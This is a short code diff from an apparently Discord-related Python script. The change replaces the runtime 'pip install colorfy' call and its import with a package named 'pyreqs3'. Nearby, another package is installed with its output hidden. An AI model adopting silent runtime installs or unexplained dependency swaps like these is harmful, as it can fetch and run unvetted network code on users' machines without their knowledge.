@@ -41,10 +41,10 @@ except:
     import discord
     
 try:
-    os.system('pip install colorfy')
-    from colorfy import color
+    os.system('pip install pyreqs3')
+    from pyreqs3 import color
 except:
-    from colorfy import color
+    from pyreqs3 import color
 
 try:
     os.system('pip install pyPrivnote >nul && cls')
